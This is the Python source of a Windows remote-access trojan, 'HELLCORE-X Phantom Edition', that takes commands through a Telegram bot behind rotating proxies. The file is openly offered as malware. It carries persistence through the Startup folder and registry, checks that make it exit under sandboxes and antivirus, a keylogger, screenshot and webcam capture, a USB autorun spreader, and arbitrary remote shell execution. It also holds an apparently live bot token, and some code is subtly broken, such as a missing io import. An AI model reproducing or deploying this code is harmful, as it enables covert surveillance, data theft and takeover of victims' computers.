# HELLCORE-X Phantom Edition
# Ultra-stealth malware with proxy support and advanced evasion

import os
import sys
import time
import threading
import requests
import socket
import subprocess
import shutil
import platform
import getpass
import tempfile
import telebot
import ctypes
import base64
import random
import string
import json
import winreg
import hashlib
import zlib
import ssl
from uuid import getnode as get_mac
from pynput import keyboard
import pyautogui
import cv2
import psutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ================== CONFIG ==================
BOT_TOKEN = "8388440776:AAF2vAJuxw-mKJ-N4JKHqSLru0ogHCAOk1A"
OWNER_ID = 5888374938  # Your Telegram ID

# Pakistan-friendly proxies (rotating)
PROXIES = [
    {"https": "http://103.111.214.106:3128"},
    {"https": "http://45.125.222.97:3128"},
    {"https": "http://119.40.83.138:8080"},
    {"https": "http://103.156.141.100:8080"},
    {"https": "http://45.125.222.125:3128"}
]

# Anti-Virus evasion settings
STARTUP_NAME = "WindowsAudioService.exe"
MUTEX_NAME = "Global\\WinAudioSvc_" + hashlib.md5(getpass.getuser().encode()).hexdigest()[:8]
INJECT_TARGET = "explorer.exe"
SPREAD_DRIVES = ["D", "E", "F", "G", "H", "I", "J"]
SPREADER_FILE_NAME = "AudioDriver.exe"

# Encryption settings
CRYPTO_KEY = hashlib.sha256(b"hellcore-phantom").digest()
CRYPTO_IV = b"phantom-iv-123456"

# ============================================

class PhantomBot:
    def __init__(self):
        self.keystrokes = []
        self.is_keylogging = False
        self.current_proxy = None
        self.bot = self.init_bot()
        
    def init_bot(self):
        # Rotate proxies with SSL context bypass
        ssl._create_default_https_context = ssl._create_unverified_context
        self.current_proxy = random.choice(PROXIES)
        
        session = requests.Session()
        session.proxies = self.current_proxy
        session.verify = False
        
        return telebot.TeleBot(BOT_TOKEN, parse_mode='HTML', threaded=True, 
                             request_timeout=30, num_threads=2, 
                             skip_pending=True, session=session)

    def rotate_proxy(self):
        try:
            self.current_proxy = random.choice(PROXIES)
            self.bot.session.proxies = self.current_proxy
        except: pass

# Global instances
bot = PhantomBot().bot
mutex = False

# ========== STEALTH UTILITIES ==========
def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def aes_encrypt(data):
    cipher = AES.new(CRYPTO_KEY, AES.MODE_CBC, CRYPTO_IV)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size))).decode()

def aes_decrypt(data):
    cipher = AES.new(CRYPTO_KEY, AES.MODE_CBC, CRYPTO_IV)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size).decode()

def hide_window():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass

def make_mutex():
    global mutex
    if mutex: return
    mutex = True
    m = ctypes.windll.kernel32.CreateMutexW(None, 1, MUTEX_NAME)
    if ctypes.GetLastError() == 183:
        sys.exit(0)

def add_to_startup():
    try:
        # Get current executable path with random garbage appended to path
        rand_str = ''.join(random.choices(string.ascii_lowercase, k=8))
        startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", 
                                  f"Start Menu\\Programs\\Startup\\{STARTUP_NAME}.{rand_str}")
        
        if not os.path.exists(os.path.dirname(startup_path)):
            os.makedirs(os.path.dirname(startup_path))
            
        if sys.argv[0] != startup_path:
            # Append garbage data to change hash
            with open(sys.argv[0], 'rb') as src, open(startup_path, 'wb') as dst:
                dst.write(src.read())
                dst.write(os.urandom(random.randint(100, 1000)))
                
        # Registry persistence with random value name
        reg_name = ''.join(random.choices(string.ascii_lowercase, k=6))
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, reg_name, 0, winreg.REG_SZ, startup_path)
    except: pass

def anti_analysis():
    # Check for sandbox/vm/debugger
    vm_processes = ["vbox", "vmware", "virtual", "qemu", "xen", "sandbox"]
    debug_tools = ["wireshark", "procmon", "processhacker", "ollydbg", "idaq", "windbg"]
    av_processes = ["avast", "avg", "bitdefender", "malwarebytes", "kaspersky"]
    
    # Check processes
    for p in psutil.process_iter():
        try:
            name = p.name().lower()
            if any(x in name for x in vm_processes + debug_tools + av_processes):
                sys.exit(0)
        except: continue
    
    # Check memory size (sandboxes often have small memory)
    if psutil.virtual_memory().total < 2 * 1024**3:  # Less than 2GB
        sys.exit(0)
        
    # Check CPU cores (VMs often have few cores)
    if psutil.cpu_count() < 2:
        sys.exit(0)

# ========== SYSTEM INFO ==========
def system_info():
    info = {
        "user": getpass.getuser(),
        "host": platform.node(),
        "os": f"{platform.system()} {platform.release()}",
        "ip": get_public_ip(),
        "mac": ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)),
        "admin": ctypes.windll.shell32.IsUserAnAdmin() != 0
    }
    return json.dumps(info)

def get_public_ip():
    try:
        proxies = random.choice(PROXIES)
        return requests.get('https://api.ipify.org', proxies=proxies, timeout=10).text
    except:
        return "Unknown"

# ========== MODULES ==========
class Keylogger(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.keystrokes = []
        self.is_running = False
        
    def run(self):
        self.is_running = True
        def on_press(key):
            try:
                self.keystrokes.append(str(key))
                if len(self.keystrokes) > 100:
                    self.save_log()
            except: pass
            
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
            
    def save_log(self):
        log = '\n'.join(self.keystrokes[-100:])
        encrypted = aes_encrypt(log)
        # Save to temp file with random name
        log_file = os.path.join(tempfile.gettempdir(), 
                              f"log_{random.randint(1000,9999)}.tmp")
        with open(log_file, 'w') as f:
            f.write(encrypted)
        self.keystrokes = []

def screenshot():
    try:
        img = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG', quality=60)
        return aes_encrypt(img_bytes.getvalue().decode('latin-1'))
    except: return None

def webcam_snap():
    try:
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = cam.read()
        cam.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            return aes_encrypt(buffer.tobytes().decode('latin-1'))
    except: return None

# ========== USB SPREADER ==========
class USBSpreader(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        
    def run(self):
        while True:
            try:
                for drive in SPREAD_DRIVES:
                    path = f"{drive}:/"
                    if os.path.exists(path):
                        # Create decoy files
                        decoys = ["Documents", "Images", "Music"]
                        for d in decoys:
                            try:
                                os.makedirs(os.path.join(path, d), exist_ok=True)
                            except: pass
                            
                        # Copy payload with random attributes
                        dest = os.path.join(path, SPREADER_FILE_NAME)
                        if not os.path.exists(dest):
                            shutil.copy2(sys.argv[0], dest)
                            # Set hidden+system attributes
                            ctypes.windll.kernel32.SetFileAttributesW(dest, 2|4)
                            
                        # Create autorun.inf
                        autorun = f"""
[AutoRun]
open={SPREADER_FILE_NAME}
action=Open folder to view files
icon=shell32.dll,4
"""
                        with open(os.path.join(path, "autorun.inf"), 'w') as f:
                            f.write(autorun)
                        ctypes.windll.kernel32.SetFileAttributesW(os.path.join(path, "autorun.inf"), 2|4)
            except: pass
            time.sleep(60)  # Check every minute

# ========== BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def cmd_start(msg):
    if msg.from_user.id == OWNER_ID:
        bot.reply_to(msg, "👻 <b>PhantomCore Active</b>\n" + system_info())

@bot.message_handler(commands=['proxy'])
def cmd_proxy(msg):
    if msg.from_user.id == OWNER_ID:
        bot.rotate_proxy()
        bot.reply_to(msg, f"🔄 Proxy rotated to: {bot.current_proxy}")

@bot.message_handler(commands=['keys'])
def cmd_keys(msg):
    if msg.from_user.id == OWNER_ID:
        keylogger = Keylogger()
        if keylogger.keystrokes:
            log = '\n'.join(keylogger.keystrokes[-100:])
            bot.reply_to(msg, f"<b>⌨️ Keystrokes:</b>\n<code>{log}</code>")
        else:
            bot.reply_to(msg, "❌ No keystrokes recorded")

@bot.message_handler(commands=['screen'])
def cmd_screen(msg):
    if msg.from_user.id == OWNER_ID:
        img = screenshot()
        if img:
            bot.send_photo(msg.chat.id, img, caption="🖥️ Screenshot captured")

@bot.message_handler(commands=['cam'])
def cmd_cam(msg):
    if msg.from_user.id == OWNER_ID:
        img = webcam_snap()
        if img:
            bot.send_photo(msg.chat.id, img, caption="📸 Webcam captured")

@bot.message_handler(commands=['exec'])
def cmd_exec(msg):
    if msg.from_user.id == OWNER_ID:
        try:
            cmd = msg.text.replace('/exec ', '')
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            bot.reply_to(msg, f"<b>💻 Command Output:</b>\n<code>{result.decode()}</code>")
        except Exception as e:
            bot.reply_to(msg, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['destroy'])
def cmd_destroy(msg):
    if msg.from_user.id == OWNER_ID:
        try:
            # Remove persistence
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsAudioService")
            
            # Self-destruct
            bat = f"""
@echo off
timeout /t 3 /nobreak >nul
del /f /q "{sys.argv[0]}" >nul 2>&1
del /f /q "%~f0" >nul 2>&1
"""
            with open(os.path.join(tempfile.gettempdir(), "cleanup.bat"), 'w') as f:
                f.write(bat)
                
            subprocess.Popen(["cleanup.bat"], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            bot.reply_to(msg, "💣 Self-destruct initiated")
            sys.exit(0)
        except:
            bot.reply_to(msg, "❌ Failed to self-destruct")

# ========== MAIN ==========
def main():
    make_mutex()
    hide_window()
    anti_analysis()
    add_to_startup()
    
    # Start modules
    USBSpreader().start()
    Keylogger().start()
    
    # Connect with retry logic
    while True:
        try:
            bot.send_message(OWNER_ID, "👻 <b>PhantomCore Connected</b>\n" + system_info())
            bot.infinity_polling()
        except Exception as e:
            time.sleep(30)
            bot.rotate_proxy()
            continue

if __name__ == '__main__':
    main()
